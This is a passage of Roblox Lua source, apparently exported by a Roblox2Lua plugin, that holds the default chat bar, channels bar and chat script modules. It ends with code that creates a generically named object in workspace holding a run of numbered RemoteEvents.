				-- the chat bar can display a message explaining that chat is turned off.
				self.GuiObject.Visible = true
			else
				self.GuiObject.Visible = enabled
			end
		end
		
		function methods:SetTextLabelText(text)
			if not self.UserHasChatOff then
				self.TextLabel.Text = text
			end
		end
		
		function methods:SetTextBoxText(text)
			self.TextBox.Text = text
		end
		
		function methods:GetTextBoxText()
			return self.TextBox.Text
		end
		
		function methods:ResetSize()
			self.TargetYSize = 0
			self:TweenToTargetYSize()
		end
		
		local function measureSize(textObj)
			return TextService:GetTextSize(
				textObj.Text,
				textObj.TextSize,
				textObj.Font,
				Vector2.new(textObj.AbsoluteSize.X, 10000)
			)
		end
		
		function methods:CalculateSize()
			if self.CalculatingSizeLock then
				return
			end
			self.CalculatingSizeLock = true
		
			local textSize = nil
			local bounds = nil
		
			if self:IsFocused() or self.TextBox.Text ~= "" then
				textSize = self.TextBox.TextSize
				bounds = measureSize(self.TextBox).Y
			else
				textSize = self.TextLabel.TextSize
				bounds = measureSize(self.TextLabel).Y
			end
		
			local newTargetYSize = bounds - textSize
			if (self.TargetYSize ~= newTargetYSize) then
				self.TargetYSize = newTargetYSize
				self:TweenToTargetYSize()
			end
		
			self.CalculatingSizeLock = false
		end
		
		function methods:TweenToTargetYSize()
			local endSize = UDim2.new(1, 0, 1, self.TargetYSize)
			local curSize = self.GuiObject.Size
		
			local curAbsoluteSizeY = self.GuiObject.AbsoluteSize.Y
			self.GuiObject.Size = endSize
			local endAbsoluteSizeY = self.GuiObject.AbsoluteSize.Y
			self.GuiObject.Size = curSize
		
			local pixelDistance = math.abs(endAbsoluteSizeY - curAbsoluteSizeY)
			local tweeningTime = math.min(1, (pixelDistance * (1 / self.TweenPixelsPerSecond))) -- pixelDistance * (seconds per pixels)
		
			local success = pcall(function() self.GuiObject:TweenSize(endSize, Enum.EasingDirection.Out, Enum.EasingStyle.Quad, tweeningTime, true) end)
			if (not success) then
				self.GuiObject.Size = endSize
			end
		end
		
		function methods:SetTextSize(textSize)
			if not self:IsInCustomState() then
				if self.TextBox then
					self.TextBox.TextSize = textSize
				end
				if self.TextLabel then
					self.TextLabel.TextSize = textSize
				end
			end
		end
		
		function methods:GetDefaultChannelNameColor()
			if ChatSettings.DefaultChannelNameColor then
				return ChatSettings.DefaultChannelNameColor
			end
			return Color3.fromRGB(35, 76, 142)
		end
		
		function methods:SetChannelTarget(targetChannel)
			local messageModeTextButton = self.GuiObjects.MessageModeTextButton
			local textBox = self.TextBox
			local textLabel = self.TextLabel
		
			self.TargetChannel = targetChannel
		
			if not self:IsInCustomState() then
				if targetChannel ~= ChatSettings.GeneralChannelName then
					messageModeTextButton.Size = UDim2.new(0, 1000, 1, 0)
					local localizedTargetChannel = targetChannel
					if ChatLocalization.tryLocalize then
						localizedTargetChannel = ChatLocalization:tryLocalize(targetChannel)
					end
					messageModeTextButton.Text = string.format("[%s] ", localizedTargetChannel)
		
					local channelNameColor = self:GetChannelNameColor(targetChannel)
					if channelNameColor then
						messageModeTextButton.TextColor3 = channelNameColor
					else
						messageModeTextButton.TextColor3 = self:GetDefaultChannelNameColor()
					end
		
					local xSize = messageModeTextButton.TextBounds.X
					messageModeTextButton.Size = UDim2.new(0, xSize, 1, 0)
					textBox.Size = UDim2.new(1, -xSize, 1, 0)
					textBox.Position = UDim2.new(0, xSize, 0, 0)
					textLabel.Size = UDim2.new(1, -xSize, 1, 0)
					textLabel.Position = UDim2.new(0, xSize, 0, 0)
				else
					messageModeTextButton.Text = ""
					messageModeTextButton.Size = UDim2.new(0, 0, 0, 0)
					textBox.Size = UDim2.new(1, 0, 1, 0)
					textBox.Position = UDim2.new(0, 0, 0, 0)
					textLabel.Size = UDim2.new(1, 0, 1, 0)
					textLabel.Position = UDim2.new(0, 0, 0, 0)
				end
			end
		end
		
		function methods:IsInCustomState()
			return self.InCustomState
		end
		
		function methods:ResetCustomState()
			if self.InCustomState then
				self.CustomState:Destroy()
				self.CustomState = nil
				self.InCustomState = false
		
				self.ChatBarParentFrame:ClearAllChildren()
				self:CreateGuiObjects(self.ChatBarParentFrame)
				self:SetTextLabelText(
					ChatLocalization:Get(
						"GameChat_ChatMain_ChatBarText",
						'To chat click here or press "/" key'
					)
				)
			end
		end
		
		function methods:EnterWhisperState(player)
			self:ResetCustomState()
			if WhisperModule.CustomStateCreator then
				self.CustomState = WhisperModule.CustomStateCreator(
					player,
					self.ChatWindow,
					self,
					ChatSettings
				)
				self.InCustomState = true
			else
				local playerName
		
				if ChatSettings.PlayerDisplayNamesEnabled then
					playerName = player.DisplayName
				else
					playerName = player.Name
				end
		
				self:SetText("/w " .. playerName)
			end
			self:CaptureFocus()
		end
		
		function methods:GetCustomMessage()
			if self.InCustomState then
				return self.CustomState:GetMessage()
			end
			return nil
		end
		
		function methods:CustomStateProcessCompletedMessage(message)
			if self.InCustomState then
				return self.CustomState:ProcessCompletedMessage()
			end
			return false
		end
		
		function methods:FadeOutBackground(duration)
			self.AnimParams.Background_TargetTransparency = 1
			self.AnimParams.Background_NormalizedExptValue = CurveUtil:NormalizedDefaultExptValueInSeconds(duration)
			self:FadeOutText(duration)
		end
		
		function methods:FadeInBackground(duration)
			self.AnimParams.Background_TargetTransparency = 0.6
			self.AnimParams.Background_NormalizedExptValue = CurveUtil:NormalizedDefaultExptValueInSeconds(duration)
			self:FadeInText(duration)
		end
		
		function methods:FadeOutText(duration)
			self.AnimParams.Text_TargetTransparency = 1
			self.AnimParams.Text_NormalizedExptValue = CurveUtil:NormalizedDefaultExptValueInSeconds(duration)
		end
		
		function methods:FadeInText(duration)
			self.AnimParams.Text_TargetTransparency = 0.4
			self.AnimParams.Text_NormalizedExptValue = CurveUtil:NormalizedDefaultExptValueInSeconds(duration)
		end
		
		function methods:AnimGuiObjects()
			self.GuiObject.BackgroundTransparency = self.AnimParams.Background_CurrentTransparency
			self.GuiObjects.TextBoxFrame.BackgroundTransparency = self.AnimParams.Background_CurrentTransparency
		
			self.GuiObjects.TextLabel.TextTransparency = self.AnimParams.Text_CurrentTransparency
			self.GuiObjects.TextBox.TextTransparency = self.AnimParams.Text_CurrentTransparency
			self.GuiObjects.MessageModeTextButton.TextTransparency = self.AnimParams.Text_CurrentTransparency
		end
		
		function methods:InitializeAnimParams()
			self.AnimParams.Text_TargetTransparency = 0.4
			self.AnimParams.Text_CurrentTransparency = 0.4
			self.AnimParams.Text_NormalizedExptValue = 1
		
			self.AnimParams.Background_TargetTransparency = 0.6
			self.AnimParams.Background_CurrentTransparency = 0.6
			self.AnimParams.Background_NormalizedExptValue = 1
		end
		
		function methods:Update(dtScale)
			self.AnimParams.Text_CurrentTransparency = CurveUtil:Expt(
					self.AnimParams.Text_CurrentTransparency,
					self.AnimParams.Text_TargetTransparency,
					self.AnimParams.Text_NormalizedExptValue,
					dtScale
			)
			self.AnimParams.Background_CurrentTransparency = CurveUtil:Expt(
					self.AnimParams.Background_CurrentTransparency,
					self.AnimParams.Background_TargetTransparency,
					self.AnimParams.Background_NormalizedExptValue,
					dtScale
			)
		
			self:AnimGuiObjects()
		end
		
		function methods:SetChannelNameColor(channelName, channelNameColor)
			self.ChannelNameColors[channelName] = channelNameColor
			if self.GuiObjects.MessageModeTextButton.Text == channelName then
				self.GuiObjects.MessageModeTextButton.TextColor3 = channelNameColor
			end
		end
		
		function methods:GetChannelNameColor(channelName)
			return self.ChannelNameColors[channelName]
		end
		
		--///////////////////////// Constructors
		--//////////////////////////////////////
		
		function module.new(CommandProcessor, ChatWindow)
			local obj = setmetatable({}, methods)
		
			obj.GuiObject = nil
			obj.ChatBarParentFrame = nil
			obj.TextBox = nil
			obj.TextLabel = nil
			obj.GuiObjects = {}
			obj.eGuiObjectsChanged = Instance.new("BindableEvent")
			obj.GuiObjectsChanged = obj.eGuiObjectsChanged.Event
			obj.TextBoxConnections = {}
			obj.PreviousText = ""
		
			obj.InCustomState = false
			obj.CustomState = nil
		
			obj.TargetChannel = nil
			obj.CommandProcessor = CommandProcessor
			obj.ChatWindow = ChatWindow
		
			obj.TweenPixelsPerSecond = 500
			obj.TargetYSize = 0
		
			obj.AnimParams = {}
			obj.CalculatingSizeLock = false
		
			obj.ChannelNameColors = {}
		
			obj.UserHasChatOff = false
		
			obj:InitializeAnimParams()
		
			ChatSettings.SettingsChanged:connect(function(setting, value)
				if (setting == "ChatBarTextSize") then
					obj:SetTextSize(value)
				end
			end)
		
			coroutine.wrap(function()
				local success, canLocalUserChat = pcall(function()
					return Chat:CanUserChatAsync(LocalPlayer.UserId)
				end)
				local canChat = success and (RunService:IsStudio() or canLocalUserChat)
				if canChat == false then
					obj.UserHasChatOff = true
					obj:DoLockChatBar()
				end
			end)()
		
		
			return obj
		end
		
		return module
		
	end[channels_bar] = function()
		--	// FileName: ChannelsBar.lua
		--	// Written by: Xsitsu
		--	// Description: Manages creating, destroying, and displaying ChannelTabs.
		
		local module = {}
		
		local PlayerGui = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
		
		--////////////////////////////// Include
		--//////////////////////////////////////
		local Chat = game:GetService("Chat")
		local clientChatModules = Chat:WaitForChild("ClientChatModules")
		local modulesFolder = script.Parent
		local moduleChannelsTab = require(modulesFolder:WaitForChild("ChannelsTab"))
		local MessageSender = require(modulesFolder:WaitForChild("MessageSender"))
		local ChatSettings = require(clientChatModules:WaitForChild("ChatSettings"))
		local CurveUtil = require(modulesFolder:WaitForChild("CurveUtil"))
		
		--////////////////////////////// Methods
		--//////////////////////////////////////
		local methods = {}
		methods.__index = methods
		
		function methods:CreateGuiObjects(targetParent)
			local BaseFrame = Instance.new("Frame")
			BaseFrame.Selectable = false
			BaseFrame.Size = UDim2.new(1, 0, 1, 0)
			BaseFrame.BackgroundTransparency = 1
			BaseFrame.Parent = targetParent
		
			local ScrollingBase = Instance.new("Frame")
			ScrollingBase.Selectable = false
			ScrollingBase.Name = "ScrollingBase"
			ScrollingBase.BackgroundTransparency = 1
			ScrollingBase.ClipsDescendants = true
			ScrollingBase.Size = UDim2.new(1, 0, 1, 0)
			ScrollingBase.Position = UDim2.new(0, 0, 0, 0)
			ScrollingBase.Parent = BaseFrame
		
			local ScrollerSizer = Instance.new("Frame")
			ScrollerSizer.Selectable = false
			ScrollerSizer.Name = "ScrollerSizer"
			ScrollerSizer.BackgroundTransparency = 1
			ScrollerSizer.Size = UDim2.new(1, 0, 1, 0)
			ScrollerSizer.Position = UDim2.new(0, 0, 0, 0)
			ScrollerSizer.Parent = ScrollingBase
		
			local ScrollerFrame = Instance.new("Frame")
			ScrollerFrame.Selectable = false
			ScrollerFrame.Name = "ScrollerFrame"
			ScrollerFrame.BackgroundTransparency = 1
			ScrollerFrame.Size = UDim2.new(1, 0, 1, 0)
			ScrollerFrame.Position = UDim2.new(0, 0, 0, 0)
			ScrollerFrame.Parent = ScrollerSizer
		
			local LeaveConfirmationFrameBase = Instance.new("Frame")
			LeaveConfirmationFrameBase.Selectable = false
			LeaveConfirmationFrameBase.Size = UDim2.new(1, 0, 1, 0)
			LeaveConfirmationFrameBase.Position = UDim2.new(0, 0, 0, 0)
			LeaveConfirmationFrameBase.ClipsDescendants = true
			LeaveConfirmationFrameBase.BackgroundTransparency = 1
			LeaveConfirmationFrameBase.Parent = BaseFrame
		
			local LeaveConfirmationFrame = Instance.new("Frame")
			LeaveConfirmationFrame.Selectable = false
			LeaveConfirmationFrame.Name = "LeaveConfirmationFrame"
			LeaveConfirmationFrame.Size = UDim2.new(1, 0, 1, 0)
			LeaveConfirmationFrame.Position = UDim2.new(0, 0, 1, 0)
			LeaveConfirmationFrame.BackgroundTransparency = 0.6
			LeaveConfirmationFrame.BorderSizePixel = 0
			LeaveConfirmationFrame.BackgroundColor3 = Color3.new(0, 0, 0)
			LeaveConfirmationFrame.Parent = LeaveConfirmationFrameBase
		
			local InputBlocker = Instance.new("TextButton")
			InputBlocker.Selectable = false
			InputBlocker.Size = UDim2.new(1, 0, 1, 0)
			InputBlocker.BackgroundTransparency = 1
			InputBlocker.Text = ""
			InputBlocker.Parent = LeaveConfirmationFrame
		
			local LeaveConfirmationButtonYes = Instance.new("TextButton")
			LeaveConfirmationButtonYes.Selectable = false
			LeaveConfirmationButtonYes.Size = UDim2.new(0.25, 0, 1, 0)
			LeaveConfirmationButtonYes.BackgroundTransparency = 1
			LeaveConfirmationButtonYes.Font = ChatSettings.DefaultFont
			LeaveConfirmationButtonYes.TextSize = 18
			LeaveConfirmationButtonYes.TextStrokeTransparency = 0.75
			LeaveConfirmationButtonYes.Position = UDim2.new(0, 0, 0, 0)
			LeaveConfirmationButtonYes.TextColor3 = Color3.new(0, 1, 0)
			LeaveConfirmationButtonYes.Text = "Confirm"
			LeaveConfirmationButtonYes.Parent = LeaveConfirmationFrame
		
			local LeaveConfirmationButtonNo = LeaveConfirmationButtonYes:Clone()
			LeaveConfirmationButtonNo.Parent = LeaveConfirmationFrame
			LeaveConfirmationButtonNo.Position = UDim2.new(0.75, 0, 0, 0)
			LeaveConfirmationButtonNo.TextColor3 = Color3.new(1, 0, 0)
			LeaveConfirmationButtonNo.Text = "Cancel"
		
			local LeaveConfirmationNotice = Instance.new("TextLabel")
			LeaveConfirmationNotice.Selectable = false
			LeaveConfirmationNotice.Size = UDim2.new(0.5, 0, 1, 0)
			LeaveConfirmationNotice.Position = UDim2.new(0.25, 0, 0, 0)
			LeaveConfirmationNotice.BackgroundTransparency = 1
			LeaveConfirmationNotice.TextColor3 = Color3.new(1, 1, 1)
			LeaveConfirmationNotice.TextStrokeTransparency = 0.75
			LeaveConfirmationNotice.Text = "Leave channel <XX>?"
			LeaveConfirmationNotice.Font = ChatSettings.DefaultFont
			LeaveConfirmationNotice.TextSize = 18
			LeaveConfirmationNotice.Parent = LeaveConfirmationFrame
		
			local LeaveTarget = Instance.new("StringValue")
			LeaveTarget.Name = "LeaveTarget"
			LeaveTarget.Parent = LeaveConfirmationFrame
		
			local outPos = LeaveConfirmationFrame.Position
			LeaveConfirmationButtonYes.MouseButton1Click:connect(function()
				MessageSender:SendMessage(string.format("/leave %s", LeaveTarget.Value), nil)
				LeaveConfirmationFrame:TweenPosition(outPos, Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.2, true)
			end)
			LeaveConfirmationButtonNo.MouseButton1Click:connect(function()
				LeaveConfirmationFrame:TweenPosition(outPos, Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.2, true)
			end)
		
		
		
			local scale = 0.7
			local scaleOther = (1 - scale) / 2
			local pageButtonImage = "rbxasset://textures/ui/Chat/TabArrowBackground.png"
			local pageButtonArrowImage = "rbxasset://textures/ui/Chat/TabArrow.png"
		
			--// ToDo: Remove these lines when the assets are put into trunk.
			--// These grab unchanging versions hosted on the site, and not from the content folder.
			pageButtonImage = "rbxassetid://471630199"
			pageButtonArrowImage = "rbxassetid://471630112"
		
		
			local PageLeftButton = Instance.new("ImageButton", BaseFrame)
			PageLeftButton.Selectable = ChatSettings.GamepadNavigationEnabled
			PageLeftButton.Name = "PageLeftButton"
			PageLeftButton.SizeConstraint = Enum.SizeConstraint.RelativeYY
			PageLeftButton.Size = UDim2.new(scale, 0, scale, 0)
			PageLeftButton.BackgroundTransparency = 1
			PageLeftButton.Position = UDim2.new(0, 4, scaleOther, 0)
			PageLeftButton.Visible = false
			PageLeftButton.Image = pageButtonImage
			local ArrowLabel = Instance.new("ImageLabel", PageLeftButton)
			ArrowLabel.Name = "ArrowLabel"
			ArrowLabel.BackgroundTransparency = 1
			ArrowLabel.Size = UDim2.new(0.4, 0, 0.4, 0)
			ArrowLabel.Image = pageButtonArrowImage
		
			local PageRightButtonPositionalHelper = Instance.new("Frame", BaseFrame)
			PageRightButtonPositionalHelper.Selectable = false
			PageRightButtonPositionalHelper.BackgroundTransparency = 1
			PageRightButtonPositionalHelper.Name = "PositionalHelper"
			PageRightButtonPositionalHelper.Size = PageLeftButton.Size
			PageRightButtonPositionalHelper.SizeConstraint = PageLeftButton.SizeConstraint
			PageRightButtonPositionalHelper.Position = UDim2.new(1, 0, scaleOther, 0)
		
			local PageRightButton = PageLeftButton:Clone()
			PageRightButton.Parent = PageRightButtonPositionalHelper
			PageRightButton.Name = "PageRightButton"
			PageRightButton.Size = UDim2.new(1, 0, 1, 0)
			PageRightButton.SizeConstraint = Enum.SizeConstraint.RelativeXY
			PageRightButton.Position = UDim2.new(-1, -4, 0, 0)
		
			local positionOffset = UDim2.new(0.05, 0, 0, 0)
		
			PageRightButton.ArrowLabel.Position = UDim2.new(0.3, 0, 0.3, 0) + positionOffset
			PageLeftButton.ArrowLabel.Position = UDim2.new(0.3, 0, 0.3, 0) - positionOffset
			PageLeftButton.ArrowLabel.Rotation = 180
		
		
			self.GuiObject = BaseFrame
		
			self.GuiObjects.BaseFrame = BaseFrame
			self.GuiObjects.ScrollerSizer = ScrollerSizer
			self.GuiObjects.ScrollerFrame = ScrollerFrame
			self.GuiObjects.PageLeftButton = PageLeftButton
			self.GuiObjects.PageRightButton = PageRightButton
			self.GuiObjects.LeaveConfirmationFrame = LeaveConfirmationFrame
			self.GuiObjects.LeaveConfirmationNotice = LeaveConfirmationNotice
		
			self.GuiObjects.PageLeftButtonArrow = PageLeftButton.ArrowLabel
			self.GuiObjects.PageRightButtonArrow = PageRightButton.ArrowLabel
			self:AnimGuiObjects()
		
			PageLeftButton.MouseButton1Click:connect(function() self:ScrollChannelsFrame(-1) end)
			PageRightButton.MouseButton1Click:connect(function() self:ScrollChannelsFrame(1) end)
		
			self:ScrollChannelsFrame(0)
		end
		
		
		function methods:UpdateMessagePostedInChannel(channelName)
			local tab = self:GetChannelTab(channelName)
			if (tab) then
				tab:UpdateMessagePostedInChannel()
			else
				warn("ChannelsTab '" .. channelName .. "' does not exist!")
			end
		end
		
		function methods:AddChannelTab(channelName)
			if (self:GetChannelTab(channelName)) then
				error("Channel tab '" .. channelName .. "'already exists!")
			end
		
			local tab = moduleChannelsTab.new(channelName)
			tab.GuiObject.Parent = self.GuiObjects.ScrollerFrame
			self.ChannelTabs[channelName:lower()] = tab
		
			self.NumTabs = self.NumTabs + 1
			self:OrganizeChannelTabs()
		
			if (ChatSettings.RightClickToLeaveChannelEnabled) then
				tab.NameTag.MouseButton2Click:connect(function()
					self.LeaveConfirmationNotice.Text = string.format("Leave channel %s?", tab.ChannelName)
					self.LeaveConfirmationFrame.LeaveTarget.Value = tab.ChannelName
					self.LeaveConfirmationFrame:TweenPosition(UDim2.new(0, 0, 0, 0), Enum.EasingDirection.In, Enum.EasingStyle.Quad, 0.2, true)
				end)
			end
		
			return tab
		end
		
		function methods:RemoveChannelTab(channelName)
			if (not self:GetChannelTab(channelName)) then
				error("Channel tab '" .. channelName .. "'does not exist!")
			end
		
			local indexName = channelName:lower()
			self.ChannelTabs[indexName]:Destroy()
			self.ChannelTabs[indexName] = nil
		
			self.NumTabs = self.NumTabs - 1
			self:OrganizeChannelTabs()
		end
		
		function methods:GetChannelTab(channelName)
			return self.ChannelTabs[channelName:lower()]
		end
		
		function methods:OrganizeChannelTabs()
			local order = {}
		
			table.insert(order, self:GetChannelTab(ChatSettings.GeneralChannelName))
			table.insert(order, self:GetChannelTab("System"))
		
			for tabIndexName, tab in pairs(self.ChannelTabs) do
				if (tab.ChannelName ~= ChatSettings.GeneralChannelName and tab.ChannelName ~= "System") then
					table.insert(order, tab)
				end
			end
		
			for index, tab in pairs(order) do
				tab.GuiObject.Position = UDim2.new(index - 1, 0, 0, 0)
			end
		
			--// Dynamic tab resizing
			self.GuiObjects.ScrollerSizer.Size = UDim2.new(1 / math.max(1, math.min(ChatSettings.ChannelsBarFullTabSize, self.NumTabs)), 0, 1, 0)
		
			self:ScrollChannelsFrame(0)
		end
		
		function methods:ResizeChannelTabText(textSize)
			for i, tab in pairs(self.ChannelTabs) do
				tab:SetTextSize(textSize)
			end
		end
		
		function methods:ScrollChannelsFrame(dir)
			if (self.ScrollChannelsFrameLock) then return end
			self.ScrollChannelsFrameLock = true
		
			local tabNumber = ChatSettings.ChannelsBarFullTabSize
		
			local newPageNum = self.CurPageNum + dir
			if (newPageNum < 0) then
				newPageNum = 0
			elseif (newPageNum > 0 and newPageNum + tabNumber > self.NumTabs) then
				newPageNum = self.NumTabs - tabNumber
			end
		
			self.CurPageNum = newPageNum
		
			local tweenTime = 0.15
			local endPos = UDim2.new(-self.CurPageNum, 0, 0, 0)
		
			self.GuiObjects.PageLeftButton.Visible = (self.CurPageNum > 0)
			self.GuiObjects.PageRightButton.Visible = (self.CurPageNum + tabNumber < self.NumTabs)
		
			if dir == 0 then
				self.ScrollChannelsFrameLock = false
				return
			end
		
			local function UnlockFunc()
				self.ScrollChannelsFrameLock = false
			end
		
			self:WaitUntilParentedCorrectly()
		
			self.GuiObjects.ScrollerFrame:TweenPosition(endPos, Enum.EasingDirection.InOut, Enum.EasingStyle.Quad, tweenTime, true, UnlockFunc)
		end
		
		function methods:FadeOutBackground(duration)
			for channelName, channelObj in pairs(self.ChannelTabs) do
				channelObj:FadeOutBackground(duration)
			end
		
			self.AnimParams.Background_TargetTransparency = 1
			self.AnimParams.Background_NormalizedExptValue = CurveUtil:NormalizedDefaultExptValueInSeconds(duration)
		end
		
		function methods:FadeInBackground(duration)
			for channelName, channelObj in pairs(self.ChannelTabs) do
				channelObj:FadeInBackground(duration)
			end
		
			self.AnimParams.Background_TargetTransparency = 0.6
			self.AnimParams.Background_NormalizedExptValue = CurveUtil:NormalizedDefaultExptValueInSeconds(duration)
		end
		
		function methods:FadeOutText(duration)
			for channelName, channelObj in pairs(self.ChannelTabs) do
				channelObj:FadeOutText(duration)
			end
		end
		
		function methods:FadeInText(duration)
			for channelName, channelObj in pairs(self.ChannelTabs) do
				channelObj:FadeInText(duration)
			end
		end
		
		function methods:AnimGuiObjects()
			self.GuiObjects.PageLeftButton.ImageTransparency = self.AnimParams.Background_CurrentTransparency
			self.GuiObjects.PageRightButton.ImageTransparency = self.AnimParams.Background_CurrentTransparency
			self.GuiObjects.PageLeftButtonArrow.ImageTransparency = self.AnimParams.Background_CurrentTransparency
			self.GuiObjects.PageRightButtonArrow.ImageTransparency = self.AnimParams.Background_CurrentTransparency
		end
		
		function methods:InitializeAnimParams()
			self.AnimParams.Background_TargetTransparency = 0.6
			self.AnimParams.Background_CurrentTransparency = 0.6
			self.AnimParams.Background_NormalizedExptValue = CurveUtil:NormalizedDefaultExptValueInSeconds(0)
		end
		
		function methods:Update(dtScale)
			for channelName, channelObj in pairs(self.ChannelTabs) do
				channelObj:Update(dtScale)
			end
		
			self.AnimParams.Background_CurrentTransparency = CurveUtil:Expt(
					self.AnimParams.Background_CurrentTransparency,
					self.AnimParams.Background_TargetTransparency,
					self.AnimParams.Background_NormalizedExptValue,
					dtScale
			)
		
			self:AnimGuiObjects()
		end
		
		--// ToDo: Move to common modules
		function methods:WaitUntilParentedCorrectly()
			while (not self.GuiObject:IsDescendantOf(game:GetService("Players").LocalPlayer)) do
				self.GuiObject.AncestryChanged:wait()
			end
		end
		
		--///////////////////////// Constructors
		--//////////////////////////////////////
		
		function module.new()
			local obj = setmetatable({}, methods)
		
			obj.GuiObject = nil
			obj.GuiObjects = {}
		
			obj.ChannelTabs = {}
			obj.NumTabs = 0
			obj.CurPageNum = 0
		
			obj.ScrollChannelsFrameLock = false
		
			obj.AnimParams = {}
		
			obj:InitializeAnimParams()
		
			ChatSettings.SettingsChanged:connect(function(setting, value)
				if (setting == "ChatChannelsTabTextSize") then
					obj:ResizeChannelTabText(value)
				end
			end)
		
			return obj
		end
		
		return module
		
	end
}

--// Scripts

-- etcrfwcfw
task.spawn(function()
	local script = etcrfwcfw
	script.Disabled = true

	script:GetPropertyChangedSignal("Disabled"):Wait()

	local oldreq = require
	local function require(target)
		if modules[target] then
			return modules[target]()
		end
		return oldreq(target)
	end

	--	// FileName: ChatScript.lua
	--	// Written by: Xsitsu
	--	// Description: Hooks main chat module up to Topbar in corescripts.
	
	local FFlagUserHandleChatHotKeyWithContextActionService = false do
		local ok, value = pcall(function()
			return UserSettings():IsUserFeatureEnabled("UserHandleChatHotKeyWithContextActionService")
		end)
		if ok then
			FFlagUserHandleChatHotKeyWithContextActionService = value
		end
	end
	
	local StarterGui = game:GetService("StarterGui")
	local GuiService = game:GetService("GuiService")
	local ChatService = game:GetService("Chat")
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	
	local MAX_COREGUI_CONNECTION_ATTEMPTS = 10
	
	local ClientChatModules = ChatService:WaitForChild("ClientChatModules")
	local ChatSettings = require(ClientChatModules:WaitForChild("ChatSettings"))
	
	local function DoEverything()
		local Chat = require(script:WaitForChild("ChatMain"))
	
		local containerTable = {}
		containerTable.ChatWindow = {}
		containerTable.SetCore = {}
		containerTable.GetCore = {}
	
		containerTable.ChatWindow.ChatTypes = {}
		containerTable.ChatWindow.ChatTypes.BubbleChatEnabled = ChatSettings.BubbleChatEnabled
		containerTable.ChatWindow.ChatTypes.ClassicChatEnabled = ChatSettings.ClassicChatEnabled
	
		--// Connection functions
		local function ConnectEvent(name)
			local event = Instance.new("BindableEvent")
			event.Name = name
			containerTable.ChatWindow[name] = event
	
			event.Event:connect(function(...) Chat[name](Chat, ...) end)
		end
	
		local function ConnectFunction(name)
			local func = Instance.new("BindableFunction")
			func.Name = name
			containerTable.ChatWindow[name] = func
	
			func.OnInvoke = function(...) return Chat[name](Chat, ...) end
		end
	
		local function ReverseConnectEvent(name)
			local event = Instance.new("BindableEvent")
			event.Name = name
			containerTable.ChatWindow[name] = event
	
			Chat[name]:connect(function(...) event:Fire(...) end)
		end
	
		local function ConnectSignal(name)
			local event = Instance.new("BindableEvent")
			event.Name = name
			containerTable.ChatWindow[name] = event
	
			event.Event:connect(function(...) Chat[name]:fire(...) end)
		end
	
		local function ConnectSetCore(name)
			local event = Instance.new("BindableEvent")
			event.Name = name
			containerTable.SetCore[name] = event
	
			event.Event:connect(function(...) Chat[name.."Event"]:fire(...) end)
		end
	
		local function ConnectGetCore(name)
			local func = Instance.new("BindableFunction")
			func.Name = name
			containerTable.GetCore[name] = func
	
			func.OnInvoke = function(...) return Chat["f"..name](...) end
		end
	
		--// Do connections
		ConnectEvent("ToggleVisibility")
		ConnectEvent("SetVisible")
		ConnectEvent("FocusChatBar")
		ConnectEvent("EnterWhisperState")
		ConnectFunction("GetVisibility")
		ConnectFunction("GetMessageCount")
		ConnectEvent("TopbarEnabledChanged")
		ConnectFunction("IsFocused")
	
		ReverseConnectEvent("ChatBarFocusChanged")
		ReverseConnectEvent("VisibilityStateChanged")
		ReverseConnectEvent("MessagesChanged")
		ReverseConnectEvent("MessagePosted")
	
		ConnectSignal("CoreGuiEnabled")
	
		ConnectSetCore("ChatMakeSystemMessage")
		ConnectSetCore("ChatWindowPosition")
		ConnectSetCore("ChatWindowSize")
		ConnectGetCore("ChatWindowPosition")
		ConnectGetCore("ChatWindowSize")
		ConnectSetCore("ChatBarDisabled")
		ConnectGetCore("ChatBarDisabled")
	
	    if not FFlagUserHandleChatHotKeyWithContextActionService then    
	        ConnectEvent("SpecialKeyPressed")
	    end
	
		SetCoreGuiChatConnections(containerTable)
	end
	
	function SetCoreGuiChatConnections(containerTable)
		local tries = 0
		while tries < MAX_COREGUI_CONNECTION_ATTEMPTS do
			tries = tries + 1
			local success, ret = pcall(function() StarterGui:SetCore("CoreGuiChatConnections", containerTable) end)
			if success then
				break
			end
			if not success and tries == MAX_COREGUI_CONNECTION_ATTEMPTS then
				error("Error calling SetCore CoreGuiChatConnections: " .. ret)
			end
			wait()
		end
	end
	
	function checkBothChatTypesDisabled()
		if ChatSettings.BubbleChatEnabled ~= nil then
			if ChatSettings.ClassicChatEnabled ~= nil then
				return not (ChatSettings.BubbleChatEnabled or ChatSettings.ClassicChatEnabled)
			end
		end
		return false
	end
	
	if (not GuiService:IsTenFootInterface()) and (not game:GetService('UserInputService').VREnabled) then
		if not checkBothChatTypesDisabled() then
			DoEverything()
		else
			local containerTable = {}
			containerTable.ChatWindow = {}
	
			containerTable.ChatWindow.ChatTypes = {}
			containerTable.ChatWindow.ChatTypes.BubbleChatEnabled = false
			containerTable.ChatWindow.ChatTypes.ClassicChatEnabled = false
			SetCoreGuiChatConnections(containerTable)
		end
	else
		-- Make init data request to register as a speaker
		local EventFolder = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents")
		EventFolder.GetInitDataRequest:InvokeServer()
	end
	
end)

--[[
	Roblox2Lua
	----------
	
	This code was generated using
	Deluct's Roblox2Lua plugin.
]]--

--// Instances

local euwifoqewuiqocujiroidjwifcoqwiro = Instance.new("AnimationController")
euwifoqewuiqocujiroidjwifcoqwiro.Name = "euwifoqewuiqocujiroidjwifcoqwiro"
euwifoqewuiqocujiroidjwifcoqwiro.Parent = workspace

local r1 = Instance.new("RemoteEvent")
r1.Name = "r1"
r1.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r10 = Instance.new("RemoteEvent")
r10.Name = "r10"
r10.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r100 = Instance.new("RemoteEvent")
r100.Name = "r100"
r100.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r1000 = Instance.new("RemoteEvent")
r1000.Name = "r1000"
r1000.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r101 = Instance.new("RemoteEvent")
r101.Name = "r101"
r101.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r102 = Instance.new("RemoteEvent")
r102.Name = "r102"
r102.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r103 = Instance.new("RemoteEvent")
r103.Name = "r103"
r103.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r104 = Instance.new("RemoteEvent")
r104.Name = "r104"
r104.Parent = euwifoqewuiqocujiroidjwifcoqwiro

